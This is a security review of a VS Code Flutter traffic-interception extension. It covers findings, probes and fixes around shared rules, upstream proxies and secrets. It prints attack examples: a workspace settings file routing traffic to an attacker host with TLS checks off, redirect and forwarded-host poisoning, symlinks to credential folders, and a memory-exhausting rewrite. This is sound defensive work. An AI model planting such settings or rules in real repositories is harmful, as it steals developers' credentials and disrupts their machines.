# Review 6: v0.6.0 security (independent, `feature/0.6.0` working tree on ff85444) — findings and fix plan

Scope: shared rules in the repo (`extension/src/rules/**` and their wiring in `src/extension.ts`), file-backed mocks,
Map Remote / rewrite / sequence / replay / upstream proxy (`proxy/src/{intercept-proxy,replay,template,upstream-proxy,
upstream-pool,lan,rules}.ts`), recordings (`src/recordings/**`), auth analysis (`src/analysis/**`), the new agent tools
and the controller / webview messages. The new trust boundary is the main subject: **a repository's
`.vscode/flutter-intercept.json`, its body files and its `.vscode/settings.json` are input the extension acts on.**

I read the code and ran throwaway probes in the session scratchpad (esbuild bundles of the real modules, outside the
repo):
- `SharedRulesCore` + the real `validateRule` on a real temp folder (approval carry-over);
- the real `InterceptProxy` with a local upstream (rewrite amplification, upstream-proxy self-loop);
- `secretKind` / `bodySecretKind` / `secretProblem` on common credential formats;
- `parseSharedFile` on adversarial 5 MB files;
- `analyzeAuth` on large request bodies;
- WHATWG URL normalisation and `dns.lookup` for the loopback trick list.

Single test files passed: extension `rules.core` (34), `rules.policy` (6), `rules.realfs` (4). I did not run the
integration, device or web suites, and did not use port 8899.

Threat model as in REVIEW-1 to REVIEW-5. The extension has no `untrustedWorkspaces` capability, so everything below
needs a workspace the user trusted. CONTRACTS §12.1 nevertheless treats a cloned repo as untrusted for routing ("a
cloned repo must not silently route the app's authenticated traffic elsewhere"), so I hold the shared file and its
neighbours to that bar. "Agent" means a possibly prompt-injected agent that has only our tools.

| # | Sev | Finding | Owner |
|---|---|---|---|
| 1 | HIGH | `flutterIntercept.upstreamProxy` and `upstreamProxyIgnoreCertErrors` have the default (window) scope. A repo's `.vscode/settings.json` can therefore send **all** of the app's pass-through traffic through any proxy on the internet, with upstream TLS verification **off**. That proxy can read and change every request, Authorization headers included. There is no approval and no indicator: the upstream proxy appears nowhere in Status or the panel. This bypasses the §12.1 gate completely. | lead + H |
| 2 | MED | Approval is carried over to entries the user never approved. Remove, Unshare and Save keep skipped entries verbatim (duplicate ids, rules past #1000, unknown kinds), then auto-approve the hash of the new file. **Probe:** `[benign "a", mapRemote→attacker "a"]`, then the user deletes "a" in the panel. The attacker rule becomes **active with no prompt**. The same happens with 1000 benign rules followed by a gated one, after deleting any one of them. | S |
| 3 | MED | Rewrite body replacement has no output bound. `find:"\""` + `replace:` 200 KB + `all` turns a 4.5 KB JSON response into **410 MB**. **Probe:** 4 parallel requests through the real proxy gave **+1.9 GB RSS** in 0.7 s. One or two more would kill the extension host, and the app gets 410 MB bodies. A shared file can do this with no approval, because response rewrites are not gated. | P + H |
| 4 | LOW-MED | The gate covers only Map Remote and request-header rewrites. A shared mock or response rewrite can still: send a `3xx` + `Location` to any host (dart:io re-sends custom credential headers such as `x-api-key`, and the query); rewrite request bodies (`redirect_uri`, callback URLs); and, in Flutter Web, serve or alter HTML/JS for **any** HTTPS site opened in the debug Chrome (a sign-in page, for example). New shared rules also start with no notice. Agents can set `Location` or `X-Forwarded-Host` the same way. | S + H |
| 5 | LOW-MED | "Edit body in a file" writes the mock body (often a real captured response with live tokens) to `.vscode/flutter-intercept/mocks/…`, which is usually committed, with **no secret check**. The share-time check refuses the *rule*, but by then the file is already in the tree. | S + W + lead |
| 6 | LOW | The approval modal has a time-of-check / time-of-use gap: it approves the content current at the click, not the content shown. It also leaves out which requests a rule matches, header values and the folder. Rule names can put newlines or bidi characters into the modal text. | lead + S |
| 7 | LOW | `openBodyFile` has no realpath check. With a committed symlink under the mocks folder, "Open file" opens any file outside the workspace, and `create` runs `mkdir -p` through the symlink (outside the workspace) before its inside check. This is the REVIEW-4 #3 "open only through `checkSourcePath`" rule again. | lead |
| 8 | LOW | The share-time secret check is narrow. It misses short credentials in credential fields (`{"password":"hunter2"}`, `x-api-key: abc123def456`), AWS key ids, 32-character hex API keys, PEM private keys, and values in the rule name or in `replaceBody.find`. | S |
| 9 | LOW | The recordings directory follows the repo's layout. A committed `.dart_tool` (or a symlink inside it) makes unredacted recordings (the panel default) land wherever the repo points, including a tracked folder. HAR exports have the same problem. | R (+ H) |
| 10 | LOW | The upstream proxy has no loopback bypass. Local-backend traffic (`localhost`, the `10.0.2.2` alias, Map Remote loopback targets) is sent to the upstream proxy. With a remote corporate proxy, that traffic and its credentials leave the machine, and the alias arrives there as `127.0.0.1`. | P |
| 11 | LOW | Documented residual: DNS rebinding on plain-HTTP LAN traffic through an upstream proxy. My assessment is below; acceptable for 0.6.0 if documented, with a cheap fix available. | P |
| 12 | INFO | Smaller items: the body-file watcher treats the path as a glob; multi-root body files resolve against the primary folder; the self-loop check misses two forms (mockttp catches the loop); auth-analysis and diff cost; dead `export`; `*.localhost` on Windows; and others. | various |

## Details

### 1 (HIGH) A repo's workspace settings choose the upstream proxy, with TLS verification off
- `packages/extension/package.json:69-79`: neither setting declares `"scope"`, so the default `window` scope lets
  workspace and folder settings set them.
- `src/extension.ts:210-221, 313`: `applyUpstreamProxy` reads `getConfiguration('flutterIntercept').get(...)`, which
  includes workspace values. It runs at activation and on every change.
- `proxyHost.setUpstreamProxy` → `InterceptProxy.setUpstreamProxy` → every pooled request, every CONNECT tunnel and
  every WebSocket goes through it (`upstream-pool.ts:104-110`).
- With `upstreamProxyIgnoreCertErrors: true`, `TunnelHttpsAgent` sets `rejectUnauthorized = false`
  (`upstream-proxy.ts:185`).

Scenario: a cloned repo commits this `.vscode/settings.json`:

```json
{ "flutterIntercept.upstreamProxy": "http://collector.attacker.example:8080",
  "flutterIntercept.upstreamProxyIgnoreCertErrors": true }
```

The user trusts the workspace (they must, to use the extension) and runs the app. Every request the app makes goes
through the attacker's proxy. That proxy terminates TLS with any certificate it likes, because verification is off,
so it reads and can change Authorization headers, cookies, bodies and responses.

- Without the second key it still sees every plain-HTTP request and every CONNECT host name.
- Nothing is shown. Status, the panel and `get_status` never mention an upstream proxy. The only message appears
  when the URL is *invalid*.
- This is exactly the outcome §12.1 gates for `mapRemote`. Here it covers all hosts, with no prompt.

The `pattern` in package.json is no defence: VS Code only shows a warning for a value that doesn't match it, and
`get()` still returns the value.

Related, pre-existing: `flutterIntercept.agent.redactSecrets` and `agent.access` are also window-scoped. A repo can
turn agent redaction off, so agents (and prompt-injected agents) read raw tokens, and it can enable write access. No
earlier review covered settings scope.

**Fix (lead + H):**
- Declare `"scope": "machine"` (or `"application"`) for `upstreamProxy` and `upstreamProxyIgnoreCertErrors`. Also
  read them with `inspect()` and use only `globalValue`, because older hosts and Cursor may ignore scope.
- Do the same for `agent.redactSecrets` (or honour a workspace value only when it is *stricter*: `true`) and for
  `agent.access` (workspace may only lower it).
- Show the upstream proxy in Status and the panel ("via http://host:port", and "certificate checks OFF" in warning
  colour). Expose it in `get_status`, without credentials.
- Test: a workspace-level `upstreamProxy` is ignored, and a user-level one is applied and shown.

### 2 (MED) Approval is carried over to entries the user never approved
`src/rules/core.ts:385-423` (`prepareFolder`), `:425-434` (`commit`), `file.ts:165-177`.

- `parseSharedFile` skips some entries: a second entry with the same `id` (`duplicate id (skipped)`), entries from
  index 1000 on, and anything `validateRule` refuses (for example a rule kind this version doesn't know). They have
  no `rule`, so `approvalReason` never sees them.
- When the panel changes the file, `prepareFolder` keeps every invalid entry verbatim (`isInvalid` → `out.splice(…,
  e.raw)`).
- `trusted` is computed only from the rules *passed in*:
  `!keptPending && rules.every((r) => !approvalReason(r) || personal.has(r.id) || active.has(...))`.
- `commit` then stores the hash of the **new file**, raw entries included, as approved.

When the next read turns a carried-over entry into a valid gated rule, that rule is active straight away.

Probe (`approval.ts`: real `SharedRulesCore`, real `validateRule`, real temp folder):

| File | User action | Before | After |
|---|---|---|---|
| `[mock "a", mapRemote→https://collector.attacker.example "a"]` | delete "a" (`removeShared`) | 1 active mock, 0 pending, 1 problem | **`shared:a` mapRemote → attacker active**, 0 pending |
| same | Unshare "a" | same | **same** |
| 1000 mocks + mapRemote→attacker at #1001 | delete any one mock | 1000 active, 0 pending | **`shared:z` mapRemote → attacker active** |
| mock + `{kind:"mapRemoteV2"}` (unknown kind) | toggle `enabled` (Save) | 1 active | hash approved *with* the unknown entry. A later extension version that knows the kind runs it unprompted. |

The panel's delete button is a normal, harmless-looking action. The only trace is a "duplicate id (skipped)" or "at
most 1000 shared rules" problem line, which doesn't hint at any danger. Agents can't trigger this: `remove_rule`
refuses shared rules (`agent/api.ts:658-664`), and spent shared rules are only dropped for the session
(`controller.ts:1556-1560`).

**Fix (S):**
- Approve **rules, not files**: store the canonical JSON hash of each approved gated rule per folder (a set). A
  gated rule is active only when its own canonical hash is in the set. Content changes then revoke exactly the
  changed rules, and no carried-over or later-valid entry is ever approved implicitly. This also helps #6.
- If file-level approval is kept: compute `trusted` by re-parsing the **new text**. Every gated rule in it must be
  personal-being-shared or canonically equal to a rule that is active now. Also never mark trusted while the
  previous parse had skipped entries.
- Test the three probe rows: after the action, the attacker rule is pending.

### 3 (MED) Rewrite body replacement amplifies without bound
- `packages/proxy/src/intercept-proxy.ts:2896-2917` (`replaceInBody`): the decoded input is capped at 32 MB, but
  `text.split(find).join(replace)` has no limit on the **output**. It is bounded only by V8's maximum string length
  (~512 M characters).
- Request side: `:2056-2066`.
- Host validator (`controller.ts:466-467`): `find` ≥ 1 character, `replace` ≤ 1 MB, `all: true`, up to 20 in a
  chain.

Probe (`amp.ts`, real `InterceptProxy`, local upstream answering a 4.5 KB JSON with 2000 `"`):

```
rule: {kind:'rewrite', response:{replaceBody:[{find:'"', replace:'z'×200 KB, all:true}]}} on '*'
4 parallel 4.5 KB responses -> 410 MB, 410 MB, 410 MB, 410 MB in 664 ms; peak RSS +1919 MB
```

A few more parallel requests, or more replacements, take the extension host over its heap limit or the machine's
memory. That kills every extension in the window. The app also receives bodies of hundreds of MB.

Response rewrites are not gated (#4), so a shared file can ship this to every teammate and it runs as soon as the app
makes requests. A user rule can cause it by accident (a one-character `find` with `all`). REVIEW-5 #1 (+3.6 GB from
a WebSocket bomb) was rated MED; this is the same class.

**Fix:**
- P: before replacing, compute the result length (`count × (replace.length − find.length)`, counting matches with
  `indexOf` and stopping at the cap). Skip the replacement with a note if the body would exceed 32 MB (or the
  original size + 8 MB), on both request and response.
- H: validator caps `replace.length × 20` and refuses a `find` shorter than 2 characters together with `all` (or
  just rely on the P cap).
- Test: the probe rule leaves the body unchanged, with a note, and RSS growth stays under 100 MB.

### 4 (LOW-MED) The gate covers only re-routing; mocks and rewrites from the file can still redirect, alter and inject
`src/rules/policy.ts:41-61` holds a rule back only for `mapRemote` to a non-loopback target, or for `rewrite` with
`request.setHeaders`, also inside sequence steps. Everything else in a shared file runs without asking:

- **Redirects.** A mock or response rewrite with `status: 302/307` + `Location: https://collector.attacker.example/…`
  on a GET API.
  - dart:io follows it automatically for GET/HEAD and copies **every header except** Authorization, Cookie, and the
    WWW-/Proxy-authenticate pair to the new origin (`sky_engine/lib/_http/http_impl.dart`
    `shouldCopyHeaderOnRedirect`).
  - Custom credential headers (`x-api-key`, `x-auth-token`, `x-access-token`…), the URL path and the query reach
    the attacker. That is the same outcome the Map Remote gate prevents, for a narrower set of headers.
- **Request bodies.** `rewrite.request.replaceBody` can change what the real server receives: an OAuth
  `redirect_uri`, a webhook / callback URL, an e-mail address in a password-reset call, an amount.
- **Flutter Web.** The debug Chrome sends everything except loopback through the proxy (`debug/rewrite.ts:34,
  126-135`) and trusts our CA. A shared mock on `https://accounts.google.com/*` (or a response rewrite that adds a
  `<script>` to an HTML page) runs attacker content under the real URL with a valid certificate. That is
  phishing or a keylogger aimed at the developer, in a browser the app's OAuth flow opens on its own.
- **Silent start.** New shared rules take effect on load with no notice beyond a count in Status. A teammate's
  mock or rewrite on `*` changes the app's traffic before the user has looked at the file.

Agent side (pre-existing for `add_mock`; REVIEW-3 noted that a mock can steer the app):
- `add_rewrite` can set response `Location` + status, and request `X-Forwarded-Host` / `Forwarded` /
  `X-Original-URL`. Only credential-named request headers are refused (`api.ts:1556-1590`).
- `X-Forwarded-Host: collector.attacker.example` on a password-reset call is classic reset-link poisoning: the
  server e-mails a link with the token to the attacker's host.
- The confirmation shows the values, but nothing explains the risk.

**Fix:**
- S: also gate:
  - mock / sequence-mock / response-rewrite that set `location` (or a 3xx status) to a host other than the request's
    own or loopback;
  - any `request.replaceBody`;
  - any rule whose match host is not one of the app's API hosts when Flutter Web is in use. Simplest: gate shared
    rules that answer with, or rewrite, `text/html` / JavaScript.
- lead:
  - On first load of a new file content, show one notice listing the hosts its rules touch, with "Review file".
  - In the approval modal, list the match pattern of each held rule (see #6).
- H: agents may not set response `location` to a non-loopback, non-same-origin host (same for `add_mock` headers).
  Refuse request `x-forwarded-*`, `forwarded`, `x-original-url`, `x-rewrite-url`, `x-host`, `x-http-method-override`
  in `add_rewrite`.

### 5 (LOW-MED) "Edit body in a file" commits real secrets
- `webview/src/components/RulesView.tsx:321` posts `openBodyFile {path, create: {content: f.mockBody}}` with the
  editor's current body.
- `src/extension.ts:291-301` writes it under `.vscode/flutter-intercept/mocks/` with no check.
- `core.ts:626-644` `createBodyFile` (the service variant) doesn't check either.

The usual way to make a mock is "Mock this" on a real response, which copies live access / refresh tokens, session
ids and personal data into the body. One click on "Edit body in a file" puts them in a file under `.vscode/`. Teams
that share rules commit that folder; it is the whole point of the feature.

`secretProblem` runs only when the *rule* is shared, so it refuses the share while leaving the file in the working
tree for the next `git add .`.

**Fix:**
- S / lead: run `bodySecretKind` (after #8's improvements) before writing a body file. On a hit, ask: "This body
  contains what looks like a JWT; replace it with a placeholder?", or write the file redacted with `redactBodyText`
  and say so.
- W: show the same warning inline in the editor when the body looks like a secret and "Edit in a file" is chosen.

### 6 (LOW) Approval modal: TOCTOU and missing detail
- `src/extension.ts:228-238`: the reasons are computed, the modal awaits the user, then `shared.approvePending()`
  runs. `core.ts:324-333` approves `fs.good.hash` as it is **then**. A watcher reload while the modal is open
  (`git pull` in a terminal, a branch switch from the SCM view, a teammate's sync) changes what gets approved. The
  user approved text describing different rules.
- What the modal shows (`core.ts:149-151`, `policy.ts:41-48, 64-67`) is `Rule "<name>" sends the app's requests to
  <origin>`. Missing:
  - **which requests** (the match URL: `*` means all traffic);
  - the header **values** a rewrite sets;
  - which folder's file, in multi-root (the title always says `.vscode/flutter-intercept.json`).
- Rule names are attacker text up to 80 characters and may contain `\n` and bidi controls. The detail is
  `reasons.join('\n')`, so a name can add a fake line ("Verified by your team lead") or reorder text.
  (`pendingView` strips newlines for the panel, but not for the modal.)

**Fix:**
- lead: capture the per-folder hashes (or, with #2's fix, the rule hashes) when building the modal and pass them to
  `approvePending(expected)`. If anything changed, refuse with "The file changed while you were deciding; review it
  again".
- S:
  - `pendingReasons` lists `<method> <match url> → <target>` and, for rewrites, `name: value` (capped), plus the
    file label;
  - strip control and bidi characters from names (as `pendingView` does with newlines).

### 7 (LOW) `openBodyFile` opens and creates through symlinks
`src/extension.ts:291-302`:
- `shared.bodyFilePath(bodyFile)` is `path.resolve(primaryFolder, rel)`, with no realpath check.
- The controller's `checkBodyFile` (`controller.ts:1041-1053`) refuses `..` and absolute paths, but not symlinks.

Git stores symlinks. A repo commits `.vscode/flutter-intercept/mocks → /Users/<you>/.aws` (or `~/.ssh`) and a shared
rule `bodyFile: ".vscode/flutter-intercept/mocks/credentials"`:
- The proxy side refuses it correctly (`checkBodyFile` in `rules/bodyFile.ts` realpath-checks), but the rule is
  still listed in the panel with its file.
- "Open file" → `fs.existsSync(abs)` → `showTextDocument(abs)` opens `~/.aws/credentials` in an editor tab. Editor
  AI features (Copilot, Cursor, Claude Code's IDE context) read open tabs.
- With a dangling target, "Create file" runs `fs.mkdirSync(path.dirname(abs), {recursive: true})` **through the
  symlink, outside the workspace**, before the realpath-of-parent check refuses the write.

**Fix (lead):** realpath-check `abs` (existing file) or its nearest existing ancestor (create) with
`checkSourcePath(…, workspaceRoots)` **before** `mkdir` and before opening. Create directories with the core's
`ensureDirInside`. Resolve against the rule's own folder (`shared.bodyFilePath(bodyFile, ruleId)`; see #12).

### 8 (LOW) Share-time secret detection is narrow
`src/rules/policy.ts:72-134`. Probe (`secrets.ts`), "–" = not refused:

| Value | Result |
|---|---|
| `ghp_…` (40), `sk_live_…`, `AIza…`, `xoxb-…`, AWS secret key | long random token ✔ |
| `AKIA…(20-char AWS key id)` (AWS key id), `0123…cdef` (32 hex) | – |
| PEM `-----BEGIN PRIVATE KEY-----…` | – |
| `{"password":"hunter2"}`, `{"access_token":"abc123"}`, `{"client_secret":"s3cr3t-value-1234"}`, `password=hunter2&…` | – |
| header `x-api-key: abc123def456`, `authorization: my-secret-password-value` | – |
| JWT in the rule `name`, or in `replaceBody[].find` | – |
| `?api_key=abc123` in the match URL | – |

The check uses only the agent redactor's *value* detectors. The redactor's other half, sensitive key names
(`password`, `token`, `secret`, `api[-_]?key`, `session`, `auth`, `credential`), is not used for JSON keys, form
fields, URL query parameters or credential-named headers.

**Fix (S):**
- Refuse a non-placeholder value under a sensitive JSON key, form field or query parameter (allow
  `test-…`, `placeholder`, `xxx`, `<…>`, `${…}`, `[redacted]`, and anything under 4 characters).
- Refuse any value of `authorization` / `cookie` / `x-api-key`-style headers except the same placeholders.
- Add PEM blocks, `AKIA[0-9A-Z]{16}`, and ≥ 32-character hex.
- Also check `name` and `replaceBody[].find`.

### 9 (LOW) Recordings follow the repo's `.dart_tool` layout
- `src/recordings/store.ts:198-201, 327-331`: `mkdir(<root>/.dart_tool/flutter_intercept/recordings, {recursive})`
  then `writeNew` + `rename`. Neither is realpath-checked. `list` / `load` refuse a symlinked *file* (`lstat`), but
  not a symlinked directory on the way.
- A repo that commits `.dart_tool` (it is gitignored only by convention) or a symlink
  `.dart_tool/flutter_intercept → ../docs/` sends recordings there:
  - the panel saves **unredacted** by default (`controller.ts:1262`, by design for replay);
  - so real tokens land in a tracked folder for the next commit, or in a synced folder outside the repo.
- HAR exports (`.dart_tool/flutter_intercept/exports`, CONTRACTS §8) have the same layout.

**Fix:**
- R: before writing, require `realpath(dir)` to be `<realpath(root)>/.dart_tool/flutter_intercept/recordings`. Check
  each existing component with `lstat`, refuse symlinks, and create the missing ones with `mkdir` without
  `recursive`.
- H: same for exports.
- Optional: refuse when `git check-ignore` says the folder is not ignored.

### 10 (LOW) Upstream proxy: no loopback bypass
- `packages/proxy/src/upstream-pool.ts:104-110` returns the upstream agents for every protocol, whatever the
  destination.
- `setUpstream` (`:154-156`) passes the emulator alias (`10.0.2.2 → 127.0.0.1`) into the agents. So:
  - an app request to `http://10.0.2.2:8080/…` or `http://localhost:8080/…` (a local backend);
  - and every Map Remote to a loopback target (the agent-only option, and ungated shared rules)

  go as `GET http://127.0.0.1:8080/… HTTP/1.1` **to the upstream proxy**.

With Charles on this Mac that works. With a corporate or remote proxy:
- the local-backend requests, with their Authorization headers (often staging tokens), leave the machine;
- the proxy connects to *its own* loopback.

Combined with #1, it also means repo-chosen proxies receive local-backend traffic.

**Fix (P):** bypass the upstream proxy (use the direct pool) for loopback and alias targets, like `NO_PROXY=localhost,
127.0.0.0/8, ::1`. Optionally make the bypass list a setting.

### 11 (LOW) DNS rebinding through the upstream proxy (documented residual): assessment
`upstream-proxy.ts:138-162`. For LAN clients, the guard resolves and checks the name, then the request goes in
absolute form **by name**. The upstream proxy resolves it again.

Exploitation needs all of the following:
- LAN mode (a physical iPhone);
- an upstream proxy;
- a **plain-HTTP** request to an attacker-controlled name. A WebView page or an ad SDK in the app can do that, and
  dart:io doesn't block cleartext;
- a rebinding DNS that answers the guard with a public IP and the proxy, milliseconds later, with `127.0.0.1`.
  Practical with TTL-0 rebinding services. The proxy's own DNS cache can defeat it.

What the attacker reaches is the **upstream proxy host's** loopback:
- with Charles / Burp on this Mac, this Mac's loopback services (dev databases, admin consoles, the MCP port, which
  is token-gated);
- with a remote proxy, that box's loopback.

A same-origin page that triggered the request can read the response.

HTTPS, WebSockets and all CONNECT traffic are pinned to the checked IP, as the spike says. Agreed: acceptable for
0.6.0 if it is listed in the README's LAN limitations.

**Fix (P, cheap):** for LAN plain-HTTP via an upstream proxy, open a CONNECT tunnel to the checked `IP:port` and
send origin-form inside it (Charles, Burp and mitmproxy allow CONNECT to :80). Fall back to refusing (403) when the
proxy refuses that CONNECT, rather than sending by name.

### 12 (INFO)
- **Body-file watcher uses the path as a glob** (`rules/service.ts:83-103`, `core.ts:574`). `bodyFile` may contain
  `*`, `{}` and `[]`: the validator refuses only `..`, absolute paths and control characters.
  - `"**/*"` creates a recursive watcher on the whole workspace, which fires on every build.
  - A real file named `mocks/[id].json` never triggers its watcher, so its edits don't reach the proxy.
  - Up to 256 watchers are never pruned.

  Fix: escape glob metacharacters (`[`→`[[]`, …) or watch the exact `Uri`.
- **Multi-root body files** (`extension.ts:206`, `:292`):
  - `setBodyFileResolver((p) => shared.resolveBodyFile(p))` and `openBodyFile` resolve every `bodyFile` against
    the *primary* folder. A secondary folder's shared rule reads, and offers to create, the wrong file.
  - `core.resolveBodies` (folder-aware) is unused. Pass the rule id through.
- **Self-loop check** (`intercept-proxy.ts:909-916`) misses `http://localhost.:<port>` and
  `http://[::ffff:127.0.0.1]:<port>`. Probe: both are accepted, but mockttp's "Passthrough loop detected" stops the
  loop (500, 2 exchanges). Normalise with `net.isIP` / a `dns.lookup` of the host, or match on the resolved address.
- **Cost:**
  - `analyzeAuth` hashes every non-auth request body on each pass (`analysis/auth.ts:184`): about 0.37 ms/MB (probe:
    250 × 1 MB in 95 ms), every second while the panel is open and traffic changes. Hash lazily, only for keys of
    pending 401s, or cache per exchange id.
  - `diff_recordings` is an unconfirmed READ tool that loads two recordings of up to 200 MB and parses every JSON
    body on each call. Consider a per-(a, b) cache or a size cap for agents.
- `RecordingStore.export` has no caller. Remove it or wire it to a save dialog.
- `isLoopbackTarget` counts `*.localhost` as loopback. Probe: macOS resolves `foo.localhost` (and `localhost.`) to
  loopback locally. Windows sends such names to DNS. Refuse `*.localhost` there, or check the resolved address at
  connect time.
- MCP hints: `replay_recording` (fallback `fail` makes all unmatched traffic fail) and `add_map_remote` carry
  neither `destructiveHint` nor `openWorldHint`. These are hints only; confirmations still apply.
- `splitSharedId` is ambiguous for folder names containing `:` (`shared@app:x:foo`). Prefer a separator that can't
  appear in folder names, or index folders.
- Shadowing is inconsistent: `controller.setSharedRules` drops a **shared** rule whose id a personal rule uses, while
  `rules/core.mergeRules` drops the **personal** one. Both need user-made ids, so this is harmless today; pick one
  rule (shared wins).

## Checked, fine
- **Loopback detection** (`policy.ts:17-30`, agent `LOOPBACK_HOSTS`), on WHATWG-normalised hosts.
  - `127.1`, `0x7f.1`, `2130706433`, `0177.0.0.1` → `127.0.0.1` (loopback, correct).
  - `[::ffff:127.0.0.1]` / `[0:0:0:0:0:ffff:127.0.0.1]` → `[::ffff:7f00:1]` (loopback, correct).
  - `%6c%6fcalhost` → `localhost`.
  - These are gated (fail-safe): `localhost.`, `0.0.0.0`, `[::]`, `127.0.0.1.nip.io` and any DNS name.
  - `mapRemoteUrl` always keeps `to`'s authority, since a prefix target always has a path. No `@` / `..` trick moves
    the host. Credentials, fragments and other schemes are refused at both layers.
- **Shared file reading:** realpath inside the folder, regular file, ≤ 5 MB before and after reading, strict UTF-8.
  The JSONC scanner caps depth at 256. Duplicate `rules` keys follow `JSON.parse`. Worst 5 MB files: ≤ 0.5 s and
  +230 MB transient (50 steps × 20 replacements × 120 rules), 0.1 s for comment / comma / whitespace floods.
  Watcher events are debounced at 300 ms.
- **Body files:** `checkSourcePath` realpath against the workspace roots, regular file, ≤ 5 MB, UTF-8, and a
  realpath re-check after reading. `..`, absolute paths, drives, UNC and `~` are refused by the validator. Git can't
  commit FIFOs or devices, and symlinks to them resolve outside the workspace.
- **Writes** (`atomicWrite`, `ensureDirInside`): every directory is realpath-checked as it is created. A rename
  replaces a symlink rather than following it. A broken file on disk is never overwritten ("Fix … first").
- **Validation path:** every rule that reaches the proxy went through `validateRule` (shared, panel, agents).
  - Sequence ≤ 50 steps, count 1–1000, no breakpoint / sequence steps.
  - Rewrite ≤ 50 headers per side, `host` / framing / `proxy-authorization` / `x-fi-id` refused, with a second
    deny list in the proxy (`REWRITE_SKIPPED`).
  - Map target checked; `ruleProblem` applied.
  - The proxy receives the resolved body as an ordinary string.
- **Approval gate:**
  - Revoked on any content change.
  - Sequence steps are inspected.
  - Edits of a shared rule from the panel are never self-approved: the id is not personal and the content is not
    active.
  - A stale panel list can't bring back an old version of a now-pending rule (filtered by file id, raw entry kept).
  - The webview can't approve: `approveSharedRules` → `sharedDeps.approvePending` always shows the modal.
  - `Status.sharedRules.pending` is sanitised for the panel.
- **Agents:**
  - `remove_rule` refuses shared rules, and spent shared rules don't write the file.
  - `add_map_remote` is loopback-only after normalisation and needs a host.
  - `add_rewrite` refuses credential-named request headers, `[redacted]` values, and `replaceBody` while redaction
    is on.
  - `expire_token` / `add_sequence` / `add_map_remote` / `add_rewrite` go through `insertRule`
    (`sensitiveQueryProbe` + `validateRule`); globs-only URLs come from the schema.
  - `save_recording` defaults to `redact: true` (the zod default is applied before dispatch), and its confirmation
    says when secrets will be written.
  - `diff_recordings` and `get_auth_flows` pass routes, details, URLs and problems through the redactor.
  - No new MCP resources.
- **Recordings:**
  - id `^[a-z0-9-]{1,80}$` (no traversal); files 0600, directory 0700; atomic writes.
  - `lstat` refuses symlinked files; 200 MB cap.
  - Strict loading: rebuilt from checked fields, header names are tokens, no CR/LF/NUL, real base64, `__proto__`-safe.
  - `diffText` redacts headers, URLs and bodies and drops cookie values; it is served from in-memory virtual
    documents (≤ 20), never written to disk.
- **Replay:**
  - Rules win.
  - Fallback `fail` is a `dns` fault inside the tunnel: no DIRECT (real-Dart test), WebSockets included.
  - Recorded headers are filtered (tokens, CR/LF/NUL, framing).
  - Decode capped at 32 MB.
  - Lookups are O(group size).
- **Upstream proxy:**
  - Credentials only in `Proxy-Authorization` (CONNECT / absolute-form); never in the getter, labels, errors or
    recorded exchanges.
  - The CONNECT response head is capped at 16 KB with a 30 s timeout.
  - The LAN gate's upstream agents resolve and check the final target and CONNECT to that IP.
  - Agents are retired on change.
- **Map Remote and LAN:** the mapped target is what the LAN deny matcher and the guarded agents check (tested,
  including GraphQL-deferred rules and WebSockets).

## Fix plan
- **lead:**
  - #1: machine / application scope (and `globalValue`-only reads) for `upstreamProxy*`; workspace may only tighten
    `agent.redactSecrets` / `agent.access`; show the upstream proxy and "certificate checks off" in Status, the panel
    and `get_status`.
  - #4: first-load notice listing the hosts a new shared file touches.
  - #5: secret check before writing body files.
  - #6: approve the hashes the modal showed; refuse if they changed.
  - #7: realpath-check `openBodyFile` before opening and before creating; resolve per rule folder.
- **S:**
  - #2: per-rule approval (canonical rule hashes), or `trusted` from a re-parse of the written text.
  - #4: gate `Location` / 3xx to other hosts, request `replaceBody`, and HTML/JS answers.
  - #6: match URL, values, file and sanitised names in `pendingReasons`.
  - #8: key-name and placeholder rules, PEM / AKIA / hex, `name` and `find`.
  - #12: glob-escaped watchers, pruning, folder-aware resolution.
- **P:**
  - #3: output cap for body replacements (request and response).
  - #10: loopback / alias bypass of the upstream proxy.
  - #11: CONNECT to the checked IP for LAN plain HTTP via an upstream proxy (or document it).
  - #12: normalised self-loop check.
- **H:**
  - #1: `get_status.upstreamProxy`.
  - #3: validator bound on `replace × count`.
  - #4: agents can't set a cross-host `Location` or forwarding / override request headers.
  - #9: realpath-checked export directory.
- **R:** #9: realpath / `lstat`-checked recordings directory.
- **W:** #5: inline secret warning on "Edit body in a file".
- **Before release, add tests:**
  - workspace `"flutterIntercept.upstreamProxy"` / `…IgnoreCertErrors` are ignored; a user-level one is applied and
    shown in Status;
  - the three approval carry-over cases in #2 leave the attacker rule pending;
  - the rewrite in #3 doesn't change the body (note set), RSS growth < 100 MB;
  - a shared mock answering `302 Location: https://other.example/` is held for approval;
  - "Edit body in a file" with a JWT in the body warns / refuses;
  - the approval modal refuses when the file changed while it was open;
  - `openBodyFile` through a symlinked mocks folder neither opens nor creates anything outside the workspace;
  - `secretProblem` refuses `{"password":"hunter2"}`, `x-api-key: abc123def456`, a PEM block, `AKIA…`;
  - a symlinked `.dart_tool/flutter_intercept` is refused for recordings;
  - with an upstream proxy set, `http://localhost:<port>` and a Map Remote to loopback bypass it.

## Resolution (2026-10-10, before release)
| # | Status | Fix |
|---|---|---|
| 1 | fixed | `flutterIntercept.upstreamProxy*` are `machine`-scoped and `agent.access` / `agent.redactSecrets` / `agent.mcpPort` `application`-scoped; all are read from user settings only (`inspect().globalValue`) in extension.ts and the MCP registration. The upstream proxy shows in the panel (warning chip, "certificate checks OFF" in red when insecure) and in `get_status`. |
| 2 | fixed | Approval per gated rule (canonical hash of the rule + file id + folder); skipped / invalid / unknown / over-limit entries are never approved implicitly; saves approve only the user's own rules as written. Old file-level approvals are ignored (re-approve once). |
| 3 | fixed | Rewrite body output ≤ min(64 MB, max(4 × input, input + 1 MB)), checked before building; over budget → forwarded unchanged with a note. `replace` ≤ 64 KB each, ≤ 256 KB per rule. |
| 4 | fixed | The gate also holds request rewrites, redirects / `location` / `refresh` / CSP / `set-cookie` / `access-control-*` / `x-forwarded-*` responses, HTML/JS/SVG/XML mocks and rewrites, `cors` rules; agents can't set those headers, can't serve HTML/JS, and 3xx only same-origin or loopback. |
| 5 | fixed | Body files are secret-checked before they are written (service and the panel's create path); the panel warns before writing captured bodies into `.vscode/`. |
| 6 | fixed | The approval modal lists each held rule (file, name, match, reasons; sanitised) and approves exactly that snapshot — nothing if the held set changed meanwhile. |
| 7 | fixed | `openBodyFile` resolves symlinks (`checkSourcePath`) and creates folders one level at a time, refusing symlinks, never overwriting. |
| 8 | fixed | Secret detection covers credential-named JSON/form/query/header values, PEM keys, AWS key ids, rule names and `replaceBody.find`; placeholders stay allowed. |
